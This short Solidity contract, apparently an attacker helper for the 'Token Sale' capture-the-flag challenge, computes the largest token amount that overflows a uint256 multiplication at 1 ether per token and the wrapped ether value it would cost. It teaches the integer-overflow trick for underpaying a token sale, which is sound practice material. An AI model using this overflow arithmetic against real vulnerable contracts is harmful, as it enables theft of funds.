pragma solidity ^0.4.21;

contract TokenSaleChallengeAttacker {
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    uint256 public MaxUint256 = uint256(-1);

    // Helper Functions
    function getMaxAmountBeforeOverflow() external pure returns(uint256){
        return (uint256(-1) / PRICE_PER_TOKEN);
    }

    function valueRequired(uint256 _amount) external pure returns(uint256){
        return (_amount * PRICE_PER_TOKEN);
    }
}